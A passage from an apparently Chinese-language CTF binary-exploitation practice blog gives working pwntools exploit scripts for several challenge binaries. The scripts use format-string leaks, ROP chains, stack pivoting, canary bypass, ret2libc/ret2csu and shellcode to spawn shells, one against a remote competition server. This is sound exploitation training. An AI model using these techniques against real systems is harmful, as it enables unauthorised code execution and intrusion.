0x000000000040127f : leave ; ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250218214438.png" alt="Pasted image 20250218214438"></p>
<h5 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h5><p>格式化字符串泄露libc+栈迁移</p>
<h5 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h5><p>printf处下断点<br><code>b* 0x401254</code><br><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223144004.png" alt="Pasted image 20250223144004"><br><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223152812.png" alt="Pasted image 20250223152812"><br><strong>6</strong></p>
<h5 id="泄露rbp"><a href="#泄露rbp" class="headerlink" title="泄露rbp"></a>泄露rbp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">p.recvuntil(&quot;What&#39;s your name?&quot;) 
payload&#x3D;b&#39;AAAA&#39;+b&#39;%22$p&#39; 
p.send(payload)

p.recvuntil(&quot;Nice to meet you \n&quot;) 
p.recvuntil(&quot;AAAA&quot;) 
rbp &#x3D; int(p.recvuntil(&quot; &quot;), 16) 
print(hex(rbp)) 
pause() 
buf&#x3D;rbp-0x30-0x80 
pop_rdi&#x3D;0x0401203 
lea_ret&#x3D;0x040127f 
ret&#x3D;0x040101a

puts_plt&#x3D;elf.plt[&#39;puts&#39;] 
puts_got&#x3D;elf.got[&#39;puts&#39;]

payload&#x3D;p64(pop_rdi) 
payload+&#x3D;p64(puts_got) 
payload+&#x3D;p64(puts_plt) 
payload+&#x3D;p64(0x0401208) 
payload.ljust(0x80,b&#39;\x00&#39;) 
payload+&#x3D;p64(buf) 
payload+&#x3D;p64(lea_ret)

p.recvuntil(&quot;Do you know stack pivating?&quot;) p.send(payload)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>22=6+128//8</code><br><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223172641.png" alt="Pasted image 20250223172641"></p>
<p><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250223173503.png" alt="Pasted image 20250223173503"><br><code>0xb0=0xb00-0xa50</code></p>
<h5 id="本地exp"><a href="#本地exp" class="headerlink" title="本地exp"></a>本地exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]
elf&#x3D;ELF(&#39;.&#x2F;ezstack&#39;)
libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)
puts_got&#x3D;elf.got[&#39;puts&#39;]
printf_got&#x3D;elf.got[&#39;printf&#39;]
read_got&#x3D;elf.got[&#39;read&#39;]

p&#x3D;process(&#39;.&#x2F;ezstack&#39;)
#p&#x3D;remote(&#39;175.27.249.18&#39;,30150)

#泄露libc
# payload1&#x3D;b&#39;AAA%8$s%9$s%10$s&#39;+p64(puts_got)+p64(printf_got)+p64(read_got)
# p.sendafter(&quot;What&#39;s your name?\n&quot;,payload1)
# p.recvuntil(&quot;Nice to meet you \n&quot;)

# data&#x3D;p.recv(27)
# puts_addr&#x3D;u64(data[3:9].ljust(8,b&#39;\x00&#39;))
# printf_addr&#x3D;u64(data[9:15].ljust(8,b&#39;\x00&#39;))
# read_addr&#x3D;u64(data[15:21].ljust(8,b&#39;\x00&#39;))

# success(&quot;puts_addr: &quot;+hex(puts_addr))
# success(&quot;printf_addr: &quot;+hex(printf_addr))
# success(&quot;read_addr: &quot;+hex(read_addr))
 
#泄露rbp
p.recvuntil(&quot;What&#39;s your name?&quot;)
payload&#x3D;b&#39;AAA%22$p&#39;

p.send(payload)
p.recvuntil(&quot;Nice to meet you \n&quot;)

rbp &#x3D; int(p.recv(17)[3:],16)
success(hex(rbp))

base&#x3D;0x00007ffff7c00000
  
bin_sh&#x3D;libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;).__next__()
bin_addr&#x3D;base+bin_sh
pop_rdi&#x3D;0x401203
leave_ret&#x3D;0x40127
system_addr&#x3D;base+libc.sym[&#39;system&#39;]
fake_rbp&#x3D;rbp-0xb0-8
payload2&#x3D; p64(pop_rdi)+p64(bin_addr)+p64(system_addr)+b&#39;A&#39;*(128-24)+p64(fake_rbp)+p64(leave_ret)

p.sendafter(&quot;Do you know stack pivating?\n&quot;,payload2)
p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="远程exp"><a href="#远程exp" class="headerlink" title="远程exp"></a>远程exp</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]
elf&#x3D;ELF(&#39;.&#x2F;ezstack&#39;)
libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)
puts_got&#x3D;elf.got[&#39;puts&#39;]
printf_got&#x3D;elf.got[&#39;printf&#39;]
read_got&#x3D;elf.got[&#39;read&#39;]

# p&#x3D;process(&#39;.&#x2F;ezstack&#39;)
p&#x3D;remote(&#39;175.27.249.18&#39;,30999)

# 泄露libc
# payload1&#x3D;b&#39;AAA%8$s%9$s%10$s&#39;+p64(puts_got)+p64(printf_got)+p64(read_got)
## fmt对应第7个，puts_got对应第8个
# p.sendafter(&quot;What&#39;s your name?\n&quot;,payload1)
# p.recvuntil(&quot;Nice to meet you \n&quot;)

# data&#x3D;p.recv(27)
# puts_addr&#x3D;u64(data[3:9].ljust(8,b&#39;\x00&#39;))
# printf_addr&#x3D;u64(data[9:15].ljust(8,b&#39;\x00&#39;))
# read_addr&#x3D;u64(data[15:21].ljust(8,b&#39;\x00&#39;))

# success(&quot;puts_addr: &quot;+hex(puts_addr))
# success(&quot;printf_addr: &quot;+hex(printf_addr))
# success(&quot;read_addr: &quot;+hex(read_addr))

#be0

#泄露rbp
p.recvuntil(&quot;What&#39;s your name?&quot;)
payload&#x3D;b&#39;AAAAAAA%8$s%22$p&#39; + p64(puts_got)

p.send(payload)
p.recvuntil(&quot;Nice to meet you \n&quot;)

p.recvuntil(&quot;AAAAAAA&quot;)

puts_addr&#x3D;u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
success(&quot;puts_addr:&quot;+hex(puts_addr))
rbp&#x3D;int(p.recv(14),16)
success(&quot;rbp:&quot;+hex(rbp))

base&#x3D;puts_addr-0x080e50

bin_addr&#x3D;base+0x1d8678
pop_rdi&#x3D;0x401203
leave_ret&#x3D;0x40127f
system_addr&#x3D;base+0x050d70 

fake_rbp&#x3D;rbp-0xb0-8
payload2&#x3D; p64(pop_rdi)+p64(bin_addr)+p64(system_addr)+b&#39;A&#39;*(128-24)+p64(fake_rbp)+p64(leave_ret)

p.sendafter(&quot;Do you know stack pivating?\n&quot;,payload2)
p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h3><h4 id="List（Day2-25-2-24）"><a href="#List（Day2-25-2-24）" class="headerlink" title="List（Day2 25/2/24）"></a>List（Day2 25/2/24）</h4><p><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250224170216.png" alt="Pasted image 20250224170216"><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">0x0000000000400acc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400ace : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400ad0 : pop r14 ; pop r15 ; ret
0x0000000000400ad2 : pop r15 ; ret
0x0000000000400acb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400acf : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004006c0 : pop rbp ; ret
0x0000000000400ad3 : pop rdi ; ret
0x0000000000400ad1 : pop rsi ; pop r15 ; ret
0x0000000000400acd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret

0x00000000004005c9 : ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;] 

p&#x3D;process(&quot;.&#x2F;list&quot;)
# p&#x3D;remote(&quot;175.27.249.18&quot;,31766)   

elf&#x3D;ELF(&#39;.&#x2F;list&#39;)
libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)

def choice(index):
    p.sendlineafter(&quot;Your option:&quot;,str(index))

def change(index,content):
    choice(1)
    p.sendline(str(index))
    p.sendline(str(content))

def exit():
    choice(5)

&#39;&#39;&#39;
0x0000000000400ad3 : pop rdi ; ret
0x00000000004005c9 : ret
&#39;&#39;&#39;
puts_got&#x3D;elf.got[&#39;puts&#39;]
puts_plt&#x3D;elf.plt[&#39;puts&#39;]
rdi&#x3D;0x400ad3
ret&#x3D;0x4005c9
main_addr&#x3D;0x4007c1
change(19,rdi)
change(20,puts_got)
change(21,puts_plt)
change(22,main_addr)
exit()

p.recvuntil(&quot;\n&quot;)
puts_addr&#x3D;u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
success(&quot;puts_addr:&quot;+hex(puts_addr))

base_addr&#x3D;puts_addr-libc.sym[&#39;puts&#39;]
success(&quot;base_addr:&quot;+hex(base_addr))

system_addr&#x3D;base_addr+libc.sym[&#39;system&#39;]
binsh_addr&#x3D;base_addr+next(libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;))
success(&quot;system_addr:&quot;+hex(system_addr))
success(&quot;binsh_addr:&quot;+hex(binsh_addr))

change(19,rdi)
change(20,binsh_addr)
change(21,system_addr)
change(22,main_addr)
exit()
p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="Normal-shellcode"><a href="#Normal-shellcode" class="headerlink" title="Normal_shellcode"></a>Normal_shellcode</h4><p><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250225113806.png" alt="Pasted image 20250225113806"></p>
<h2 id="NISACTF"><a href="#NISACTF" class="headerlink" title="NISACTF"></a>NISACTF</h2><h3 id="ezheap"><a href="#ezheap" class="headerlink" title="ezheap"></a>ezheap</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *

io&#x3D;process(&#39;.&#x2F;ez_heap&#39;)
p &#x3D; ELF(&quot;ez_heap&quot;)
payload &#x3D; cyclic(0x20)
payload +&#x3D; b&#39;&#x2F;bin&#x2F;sh\x00&#39;
io.sendline(payload)
io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="girl-friend"><a href="#girl-friend" class="headerlink" title="girl_friend"></a>girl_friend</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]   

elf&#x3D;ELF(&#39;girlfriend&#39;)
p&#x3D;process(&#39;.&#x2F;girlfriend&#39;)

def choice(num):
    p.recvuntil(&quot;Your choice :&quot;)
    p.sendline(str(num))
def add(name_size,name):
    choice(1)
    p.sendafter(&quot;Her name size is :&quot;,name_size)
    p.sendafter(&quot;Her name is :&quot;,name)
def delete(index):
    choice(2)
    p.sendlineafter(&#39;Index :&#39;,index)
def show(index):
    choice(3)
    p.sendafter(&quot;Index :&quot;,index)

backdoor_addr&#x3D;0x400B9C
add(&quot;16&quot;,p64(backdoor_addr))
add(&quot;40&quot;,&#39;bbbb&#39;)
delete(&quot;0&quot;)
delete(&quot;1&quot;)

add(&quot;16&quot;,p64(backdoor_addr))

show(&quot;0&quot;)
p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="鹤城杯"><a href="#鹤城杯" class="headerlink" title="鹤城杯"></a>鹤城杯</h2><h3 id="littleof-2021鹤城杯"><a href="#littleof-2021鹤城杯" class="headerlink" title="littleof(2021鹤城杯)"></a>littleof(2021鹤城杯)</h3><p><img src="/img/loading.gif" data-original="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250312131636.png" alt="Pasted image 20250312131636"><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *

context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)
context.terminal &#x3D; [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]

p&#x3D;process(&#39;.&#x2F;littleof&#39;)
elf &#x3D; ELF(&#39;.&#x2F;littleof&#39;)
libc &#x3D; ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)

pl1&#x3D;&#39;a&#39;*0x49
p.sendafter(&#39;overflow?\n&#39;,pl1)
data&#x3D;p.recv()
canary&#x3D;b&#39;\x00&#39;+data[0x49:0x49+7]
canary &#x3D; int.from_bytes(canary,&#39;little&#39;)

success(&#39;canary:&#39;)
success(hex(canary))

#ret2libc

# 0x000000000040059e : ret
# 0x0000000000400863 : pop rdi ; ret
ret&#x3D;0x40059e
pop_rdi&#x3D;0x400863
func&#x3D;0x4006E2

payload2 &#x3D; b&#39;a&#39;*0x48 + p64(canary) + b&#39;a&#39;*8 + p64(pop_rdi) + p64(elf.got[&#39;puts&#39;]) + p64(elf.plt[&#39;puts&#39;]) + p64(func)
p.sendline(payload2)

p.recvuntil(b&#39;win&#39;)
p.recv(1)
puts_addr &#x3D; u64(p.recv(6).ljust(8, b&#39;\0&#39;))
success(&#39;puts_addr:&#39;)
success(hex(puts_addr))

libc.address &#x3D; puts_addr - libc.symbols[&#39;puts&#39;]
success(&#39;libc.address:&#39;)
success(hex(libc.address))

binsh &#x3D; next(libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;))
success(&#39;binsh:&#39;)
success(hex(binsh))

system &#x3D; libc.symbols[&#39;system&#39;]
success(&#39;system:&#39;)
success(hex(system))

p.sendafter(&#39;overflow?\n&#39;,pl1)
data&#x3D;p.recv()
canary&#x3D;b&#39;\x00&#39;+data[0x49:0x49+7]
canary &#x3D; int.from_bytes(canary,&#39;little&#39;)

success(&#39;canary:&#39;)
success(hex(canary))
payload2&#x3D;b&#39;a&#39;*0x48 + p64(canary) + b&#39;a&#39;*8  +p64(ret)+p64(pop_rdi) + p64(binsh) + p64(system)
p.send(payload2)

p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="Geek-Challenge"><a href="#Geek-Challenge" class="headerlink" title="Geek Challenge"></a><strong>Geek Challenge</strong></h2><h3 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *

context.arch &#x3D; &#39;amd64&#39;
context.os &#x3D; &#39;linux&#39;
context.log_level &#x3D; &#39;debug&#39;

p &#x3D; process(&#39;.&#x2F;shellcode&#39;)

shellcode &#x3D; asm(shellcraft.sh())
p.sendline(shellcode)
backdoor &#x3D; 0x401256
p.sendline(b&quot;A&quot;*(0x18+8) + p64(backdoor))

p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="买黑吗喽了吗（整数溢出，栈溢出）"><a href="#买黑吗喽了吗（整数溢出，栈溢出）" class="headerlink" title="买黑吗喽了吗（整数溢出，栈溢出）"></a>买黑吗喽了吗（整数溢出，栈溢出）</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *

context.arch &#x3D; &#39;amd64&#39;
context.os &#x3D; &#39;linux&#39;
context.log_level &#x3D; &#39;debug&#39;

p &#x3D; process(&#39;.&#x2F;syscall&#39;)
elf&#x3D;ELF(&#39;.&#x2F;syscall&#39;)
libc&#x3D;ELF(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)

for i in range(9):
    p.sendlineafter(&#39;choice:&#39;,&quot;1&quot;)
    p.sendlineafter(&#39;choice:&#39;,&quot;1&quot;)

p.sendlineafter(&#39;choice:&#39;,&quot;1&quot;)
p.sendlineafter(&#39;choice:&#39;,&quot;2&quot;)

p.sendlineafter(&#39;choice:&#39;,&quot;2&quot;)
p.send(b&#39;%p&#39;)

p.recvuntil(&#39;0x0x&#39;)
base&#x3D;int(p.recv(12),16)-0x4090
success(&#39;base:&#39;+hex(base))

rdi&#x3D;base+0x11f1
rsi&#x3D;base+0x11f3
rax&#x3D;base+0x11f7
bss&#x3D;base+0x4090
rdx&#x3D;base+0x11f5
syscall&#x3D;base+0x11EE

rop&#x3D;p64(rax)+p64(0)+p64(rdi)+p64(0)+p64(rsi)+p64(bss)+p64(rdx)+p64(0x8)+p64(syscall)
rop+&#x3D;p64(rax)+p64(0x3b)+p64(rdi)+p64(bss)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(syscall)

payload&#x3D;b&quot;A&quot;*0x58+rop
payload&#x3D;payload.ljust(0x100,b&quot;\x00&quot;)

p.sendlineafter(&#39;your choice:&#39;,&quot;3&quot;)

p.sendafter(&#39;feedback&#39;,payload)
p.send(&#39;&#x2F;bin&#x2F;sh\x00&#39;)

p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="su"><a href="#su" class="headerlink" title="su~~~~"></a>su~~~~</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
context.log_level &#x3D; &#39;debug&#39;
context.arch &#x3D; &#39;amd64&#39;
p &#x3D; process(&#39;.&#x2F;csu&#39;)
elf &#x3D; ELF(&#39;.&#x2F;csu&#39;)
libc &#x3D; ELF(&#39;.&#x2F;libc.so.6&#39;)

#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 
li &#x3D; lambda x : print(&#39;\\x1b[01;38;5;214m&#39; + x + &#39;\\x1b[0m&#39;) 
ll &#x3D; lambda x : print(&#39;\\x1b[01;38;5;1m&#39; + x + &#39;\\x1b[0m&#39;) 
s &#x3D; lambda s : p.send(s) 
sl &#x3D; lambda s : p.sendline(s) 
sa &#x3D; lambda n,s : p.sendafter(n,s) 
sla &#x3D; lambda n,s : p.sendlineafter(n,s) 
r &#x3D; lambda n : p.recv(n) 
rl &#x3D; lambda : p.recvline() 
ru &#x3D; lambda s : p.recvuntil(s) 
ra &#x3D; lambda : p.recvall() 
ia &#x3D; lambda : p.interactive() 
uu32 &#x3D; lambda data : u32(data.ljust(4, b&#39;\\x00&#39;)) 
uu64 &#x3D; lambda data : u64(data.ljust(8, b&#39;\\x00&#39;)) 
# u64(p.recvuntil(b&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;)) 
# u32(p.recvuntil(b&#39;\\xf7&#39;)) 
def g(): 
    gdb.attach(p) 
    pause() 
#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;


def csu(rbx, rbp, r12, r13, r14, last):
    mov_addr &#x3D; 0x4008E0
    pop_addr &#x3D; 0x4008FA
    fakeebp&#x3D;b&#39;a&#39; * 8
    payload &#x3D; b&#39;a&#39; * 0x80+fakeebp
    payload +&#x3D; p64(pop_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14)
    payload +&#x3D; p64(1)+p64(mov_addr)
    payload +&#x3D; b&#39;a&#39; * 0x38
    payload +&#x3D; p64(last)
    p.send(payload)


sla(&quot;exit.\n&quot;,b&#39;1&#39;)
puts_got &#x3D; elf.got[&#39;puts&#39;]  

read_addr&#x3D;0x400798
csu(0, 1, puts_got, puts_got, 0, read_addr)

puts_base &#x3D; u64(p.recv(6).ljust(8,b&#39;\0&#39;))
success(&#39;puts_base:&#39;+hex(puts_base))
libc.address &#x3D; puts_base - libc.sym[&#39;puts&#39;]
success(&#39;libc_base:&#39;+hex(libc.address))

ogg&#x3D;0x4f302+libc.address

payload2&#x3D;b&#39;a&#39;*0x80+b&#39;a&#39;*8+p64(ogg)
p.send(payload2)
ia()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *

context.log_level &#x3D; &#39;debug&#39;
context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p&#x3D;process(&#39;.&#x2F;fmt&#39;)

def dbg():
    gdb.attach(p)


p.sendlineafter(&#39;ID:\n&#39;,&#39;A&#39;)
p.sendafter(&#39;name?\n&#39;,&#39;%13$p%14$p&#39;)

p.recvuntil(&#39;0x&#39;)
canary &#x3D; int(p.recv(16), 16)
success(&#39;canary &#x3D;&gt;&gt; &#39; + hex(canary))
p.recvuntil(&#39;0x&#39;)
rbp &#x3D; int(p.recv(12), 16)
success(&#39;rbp &#x3D;&gt;&gt; &#39; + hex(rbp))

ret&#x3D;rbp-0x18
p.send(p64(ret+1)+b&#39;A&#39; * 0x30 + p64(canary) + p64(rbp)+ b&#39;\xEC&#39;)

# gdb.attach(p)
# pause()
p.sendafter(&#39;name?\n&#39;,b&#39;%18c%6$hhn&#39;)
p.sendafter(&#39;say?\n&#39;,b&#39;A&#39; * 0x38 + p64(canary) + p64(rbp)+ b&#39;\x85&#39;)

p.interactive()
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="真的能走到后门吗"><a href="#真的能走到后门吗" class="headerlink" title="真的能走到后门吗"></a>真的能走到后门吗</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"> from pwn import *

context.log_level &#x3D; &#39;debug&#39;
context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
p&#x3D;process(&#39;.&#x2F;fmt&#39;)

def dbg():
    gdb.attach(p)


p.sendlineafter(&#39;ID:\n&#39;,&#39;A&#39;)
p.sendafter(&#39;name?\n&#39;,&#39;%13$p%14$p&#39;)

p.recvuntil(&#39;0x&#39;)
canary &#x3D; int(p.recv(16), 16)
success(&#39;canary &#x3D;&gt;&gt; &#39; + hex(canary))
p.recvuntil(&#39;0x&#39;)
rbp &#x3D; int(p.recv(12), 16)
success(&#39;rbp &#x3D;&gt;&gt; &#39; + hex(rbp))

ret&#x3D;rbp-0x18 #动调可知此为返回地址rbp-0x18
p.send(p64(ret+1)+b&#39;A&#39; * 0x30 + p64(canary) + p64(rbp)+ b&#39;\xEC&#39;) #ret+1即为最终要修改的倒数第二个字节

# gdb.attach(p)
# pause()
p.sendafter(&#39;name?\n&#39;,b&#39;%18c%6$hhn&#39;)
p.sendafter(&#39;say?\n&#39;,b&#39;A&#39; * 0x38 + p64(canary) + p64(rbp)+ b&#39;\x85&#39;)

